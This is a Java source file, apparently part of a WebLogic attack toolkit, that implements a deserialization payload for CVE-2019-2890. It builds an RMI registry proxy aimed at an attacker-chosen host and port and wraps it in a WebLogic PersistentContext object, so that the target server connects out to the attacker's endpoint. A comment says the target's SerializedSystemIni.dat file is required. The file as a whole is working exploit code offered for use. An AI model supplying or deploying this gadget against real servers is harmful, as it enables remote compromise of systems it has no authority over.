package unserWeblogic.gadgets;

import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import weblogic.wsee.jaxws.persistence.PersistentContext;
//需要获取目标的%domain%/security/SerializedSystemIni.dat文件
public class CVE_2019_2890 implements ObjectPayload<Object>{
    public static Registry getObjectBase(final String command) throws Exception {
        String host;
        int port;
        int sep = command.indexOf(':');
        if (sep < 0) {
            port = new Random().nextInt(65535);
            host = command;
        } else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(CVE_2019_2890.class.getClassLoader(), new Class[]{
                Registry.class
        }, obj);
        return proxy;
    }

    public Object getObject(final String command) throws Exception {
        PersistentContext pc = new PersistentContext(null, null, null, null, null, CVE_2019_2890.getObjectBase(command));
        return pc;
    }
}
